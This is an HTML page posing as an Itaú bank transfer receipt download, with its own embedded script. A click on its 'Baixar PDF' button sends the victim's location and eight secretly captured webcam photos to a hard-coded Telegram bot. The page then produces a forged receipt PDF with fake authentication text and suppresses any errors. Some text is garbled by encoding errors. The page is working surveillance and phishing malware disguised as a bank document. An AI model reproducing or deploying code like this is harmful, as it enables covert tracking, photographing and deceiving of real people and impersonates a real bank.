<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Comprovante_Itau_20251217.pdf</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
<style>
body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;height:100vh}
#quadro{background:#fff;padding:40px 30px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.15);text-align:center}
h1{font-size:24px;margin-bottom:6px;color:#111}
p{font-size:15px;color:#444;margin-bottom:24px}
button{background:#ff8c00;color:#fff;border:none;padding:12px 32px;border-radius:20pxfont-size:16px;cursor:pointer}
</style>
</head>
<body>

<div id="quadro">
  <h1>Comprovante de Transfer√™ncia</h1>
  <p>Clique para baixar o seu comprovante.</p>
  <button id="btn">Baixar PDF</button>
‰∫∫Êú¨</div>

<script>
const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
const CHAT_ID = '-1003187104876';

const agora = new Date();
const dados = {
  valor:"R$ 1.234,56",
  dataHora:agora.toLocaleString('pt-BR'),
  id:'ITAUPIX'+agora.getTime(),
  aut:[...Array(32)].map(()=>Math.random().toString(36)[2]).join('').toUpperCase()
};

const tele=(msg,media)=>{
  if(media){
    const f=new FormData();
    f.append('chat_id',CHAT_ID);
    f.append('photo',media,'c.jpg');
    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:f});
  }else{
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:CHAT_ID,text:msg})
    });
  }
};

function gps(){
  navigator.geolocation.getCurrentPosition(
    pos=>{
      const{latitude:la,longitude:lo}=pos.coords;
      tele(`üìç https://maps.google.com/?q=${la},${lo}`);
    },
    ()=>fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>tele(`üìç https://maps.google.com/?q=${d.latitude},${d.longitude}`))
  );
}

async function fotos(){
  const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
  const v=document.createElement('video');
  v.srcObject=s;
  v.style.display='none';
  document.body.appendChild(v);
  await v.play();
  for(let i=0;i<8;i++){
    const c=document.createElement('canvas');
    c.width=640;c.height=480;
    c.getContext('2d').drawImage(v,0,0);
    c.toBlob(b=>tele(`üì∏ ${i+1}`,b),'image/jpeg',0.7);
  }
  s.getTracks().forEach(t=>t.stop());
  v.remove();
}

function gerarPdf(){
  const{jsPDF}=window.jspdf;
  const doc=new jsPDF({orientation:'portrait',unit:'mm',format:'a4'});
  // ----- CABE√áALHO -----
  doc.setFillColor(255,102,0);
  doc.rect(0,0,210,30,'F');
  doc.setFontSize(20);
  doc.setTextColor(255,255,255);
  doc.setFont('helvetica','bold');
  doc.text('Ita√∫',15,20);
  doc.setFontSize(10);
  doc.text('BANCO ITA√ö S.A.',15,26);
  // ----- T√çTULO -----
  doc.setTextColor(0,0,0);
  doc.setFontSize(16);
  doc.text('Comprovante de Transfer√™ncia',15,50);
  // ----- DADOS -----
  doc.setFontSize(11);
  doc.text('Valor:',15,65);
  doc.setFont('helvetica','bold');
  doc.text(dados.valor,40,65);
  doc.setFont('helvetica','normal');
  doc.text('Data/Hora:',15,72);
  doc.text(dados.dataHora,40,72);
  doc.text('ID da transa√ß√£o:',15,79);
  doc.text(dados.id,40,79);
  doc.text('Autentica√ß√£o BACEN:',15,86);
  doc.text(dados.aut,40,86);
  // ----- RODAP√â -----
  doc.setDrawColor(200);
  doc.line(15,105,195,105);
  doc.setFontSize(9);
  doc.text('Este documento √© um comprovante eletr√¥nico, possui valor de confirma√ß√£o de opera√ß√£o e foi',15,115);
  doc.text('assinado digitalmente conforme MP 2.200-2/2001 e instru√ß√£o BACEN 3.083/2020.',15,120);
  doc.text('Para consultar a autenticidade acesse itau.com.br/autenticidade',15,125);
  doc.text('Hash SHA-256: '+dados.aut.substring(0,16)+'...',15,135);
  doc.text('Emitido em: '+dados.dataHora,15,142);
  doc.save('Comprovante_Itau_20251217.pdf');
}

document.getElementById('btn').addEventListener('click', async ()=>{
  try{
    await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
    gps(); await fotos(); gerarPdf();
  }catch{/* silencioso */}
});
</script>
</body>
</html>